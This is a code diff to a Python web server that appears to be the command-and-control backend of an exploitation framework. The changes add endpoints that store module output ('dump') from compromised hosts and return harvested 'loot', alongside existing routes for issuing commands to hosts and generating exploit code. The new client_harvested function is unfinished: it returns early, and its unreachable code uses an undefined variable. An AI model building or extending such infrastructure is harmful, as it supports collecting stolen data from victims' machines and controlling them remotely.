@@ -98,6 +98,7 @@ class Webserver:
         )
 
         self.app.add_route(self.store_loot, "/store/loot/<host>", methods=["POST"])
+        self.app.add_route(self.store_json, "/store/json/<host>/<modid>", methods=["POST"])
         self.app.add_route(self.hosts_up, "/hosts/up", methods=["POST"])
         self.app.add_route(self.ports_open, "/ports/open/<localip>", methods=["POST"])
         self.app.add_route(self.new_commands, "/new/commands/<hostname>", methods=["GET"])
@@ -183,6 +184,12 @@ class Webserver:
                 methods=["GET"]
             )
 
+            self.app.add_route(
+                self.client_harvested,
+                "/client/harvested/<clientid>",
+                methods=["GET"]
+            )
+
     def set_default_options(self):
         default = [
             ("local_ip_subnet", False),
@@ -235,6 +242,7 @@ class Webserver:
         if ipc.response_valid(response, dict):
             return sanic.response.json(response["text"])
         return sanic.response.text("Not found", status=404)
+
 
     # TODO: This function has been superseded by the following two functions
     async def client_options(self, _request, exploitid, payloadid):
@@ -295,6 +303,36 @@ class Webserver:
             return sanic.response.json(response["text"])
         return sanic.response.text("", status=500)
 
+    async def client_harvested(self, _request, clientid):
+        # TODO: Complete
+        return sanic.response.text("Forbidden", 403)
+
+        parentid = self.host2clientid(request)
+        response = await ipc.async_http_raw(
+            "GET",
+            SOCK_DATABASE,
+            "/get/json/{}/childs".format(parentid)
+        )
+        if ipc.response_valid(response, list):
+            childs = response["text"]
+            if clientid not in childs:
+                return sanic.response.text("Not allowed", status=403)
+            else:
+                resp1 = await ipc.async_http_raw(
+                    "GET",
+                    SOCK_DATABASE,
+                    "/get/json/{}/dump".format(clientid)
+                )
+                resp2 = await ipc.async_http_raw(
+                    "GET",
+                    SOCK_DATABASE,
+                    "/get/json/{}/loot".format(clientid)
+                )
+                return sanic.response.json(
+                    {"loot": resp2["text"], "dump": resp1["text"]}
+                )
+        return sanic.response.raw("Error", status=500)
+
     async def client_childs(self, request):
         """
         Get all childs of current client along with some other key data.
@@ -344,6 +382,20 @@ class Webserver:
         # Default behaviour
         logger.warning("Attempted access to generate_exploit from IP: {}".format(request.ip))
         return sanic.response.text("Forbidden", status=401)
+
+    async def store_json(self, request, host, modid):
+        clientid = misc.hostname2id(host)
+        data = request.json
+        data = {modid: data}
+        response = await ipc.async_http_raw(
+            "POST",
+            SOCK_DATABASE,
+            "/merge/json/{}/dump".format(clientid),
+            json.dumps(data)
+        )
+        if ipc.response_valid(response, dict):
+            return sanic.response.json(response["text"])
+        return sanic.response.text("Error", status=500)
 
     async def store_loot(self, request, host):
         clientid = misc.hostname2id(host)
@@ -405,7 +457,7 @@ class Webserver:
             "POST",
             SOCK_MODULES,
             "/exploit/code/{}/{}".format(modid, payid),
-            args
+            json.dumps(args)
         )
 
         if ipc.response_valid(response, str):
